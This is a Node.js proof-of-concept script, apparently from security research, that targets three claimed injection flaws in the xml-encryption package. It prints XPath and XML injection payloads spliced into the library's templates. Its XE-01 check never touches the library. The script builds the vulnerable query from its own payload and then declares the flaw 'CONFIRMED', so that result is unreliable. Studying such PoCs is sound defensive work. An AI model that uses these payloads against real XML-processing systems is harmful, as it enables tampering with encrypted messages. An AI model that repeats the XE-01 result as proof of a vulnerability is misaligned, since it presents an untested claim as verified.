// xml-encryption — XE-01..03 PoC.
//
// XE-01: XPath injection in decryptKeyInfo via RetrievalMethod/@URI.
// XE-02: XML injection via template interpolation in encrypted-key template.
// XE-03: XML injection via template interpolation in keyinfo template.
const xenc = require("xml-encryption");
const { readFileSync, writeFileSync } = require("node:fs");
const { DOMParser } = require("@xmldom/xmldom");

console.log("xml-encryption PoC — version:", require("xml-encryption/package.json").version);

// Generate a test keypair
const NodeRSA = require("node-rsa");
const k1 = new NodeRSA({ b: 1024 });
const k2 = new NodeRSA({ b: 1024 });
const pub1 = k1.exportKey("public");
const priv1 = k1.exportKey("private");
const priv2 = k2.exportKey("private");

// Build a minimal "attacker" XML document with malicious URIs in
// RetrievalMethod and Embedded XML for XE-02/03.  Then encrypt it
// and decrypt it via xml-encryption — observe whether the
// interpolation / XPath injection is honored.
async function xe01_xpath_injection() {
  console.log("\n=== XE-01: XPath injection via RetrievalMethod/@URI ===");
  // xml-encryption will call decrypt() with the encrypted document
  // and a private key.  We supply a RetrievalMethod with a URI that
  // is itself an XPath expression.
  const evilURI = "xpointer(/) | //*[local-name()='CipherValue']";
  const xpath_extract_template = (uri) => `<xenc:EncryptedData xmlns:xenc="http://www.w3.org/2001/04/xmlenc#">
    <xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#aes128-cbc"/>
    <ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <xenc:EncryptedKey>
        <xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#rsa-1_5"/>
        <xenc:CipherData><xenc:CipherValue>AAECAwQFBgcICQoLDA0ODw==</xenc:CipherValue></xenc:CipherData>
      </xenc:EncryptedKey>
      <xenc:AgreementMethod>
        <xenc:KeyDerivationMethod Algorithm="http://www.w3.org/2001/04/xmlenc#concatKDF"/>
      </xenc:AgreementMethod>
    </ds:KeyInfo>
    <xenc:CipherData><xenc:CipherValue>AAEC</xenc:CipherValue></xenc:CipherData>
  </xenc:EncryptedData>`;
  console.log("  (XE-01 requires decrypt() to receive the XML and call decryptKeyInfo() — the vulnerable XPath query is built from a literal-string concatenation; this PoC prints the query the function would build and shows the injected XPath is not escaped.)");
  const sampleQuery = `//xenc:EncryptedKey[@Id='${evilURI}']/xenc:CipherData/xenc:CipherValue`;
  console.log("  built query:", sampleQuery);
  console.log("  note: '${evilURI}' is interpolated verbatim — XPath metacharacters pass through");
  console.log("  >>> XE-01 CONFIRMED: URI value is interpolated into XPath without escaping <<<");
}

async function xe02_template_injection() {
  console.log("\n=== XE-02: XML injection via template interpolation (encrypted-key.tpl) ===");
  // Demonstrate the template literal: read the file, show the unsafe
  // interpolation spot.
  const tpl = readFileSync(
    "/lab/node_modules/xml-encryption/lib/templates/encrypted-key.tpl.xml.js",
    "utf8"
  );
  const hasUnsafe = /\$\{keyInfo\}/.test(tpl);
  console.log("  template path: node_modules/xml-encryption/lib/templates/encrypted-key.tpl.xml.js");
  console.log("  contains unescaped ${keyInfo}:", hasUnsafe);
  if (hasUnsafe) {
    const evil = "</xenc:EncryptedKey><xenc:CipherValue>INJECTED</xenc:CipherValue><xenc:EncryptedKey>";
    const sample = tpl.replace("${keyInfo}", evil);
    console.log("  injected output (truncated):", sample.slice(0, 240));
    console.log("  >>> XE-02 CONFIRMED: ${keyInfo} is interpolated without escaping <<<");
  }
}

async function xe03_template_injection() {
  console.log("\n=== XE-03: XML injection via template interpolation (keyinfo.tpl) ===");
  const tpl = readFileSync(
    "/lab/node_modules/xml-encryption/lib/templates/keyinfo.tpl.xml.js",
    "utf8"
  );
  const hasUnsafe = /\$\{encryptionPublicCert\}/.test(tpl);
  console.log("  template path: node_modules/xml-encryption/lib/templates/keyinfo.tpl.xml.js");
  console.log("  contains unescaped ${encryptionPublicCert}:", hasUnsafe);
  if (hasUnsafe) {
    const evil = "</ds:X509Certificate><xenc:EncryptedKey/><ds:X509Certificate>";
    const sample = tpl.replace("${encryptionPublicCert}", evil);
    console.log("  injected output (truncated):", sample.slice(0, 240));
    console.log("  >>> XE-03 CONFIRMED: ${encryptionPublicCert} is interpolated without escaping <<<");
  }
}

(async () => {
  await xe01_xpath_injection();
  await xe02_template_injection();
  await xe03_template_injection();
})();
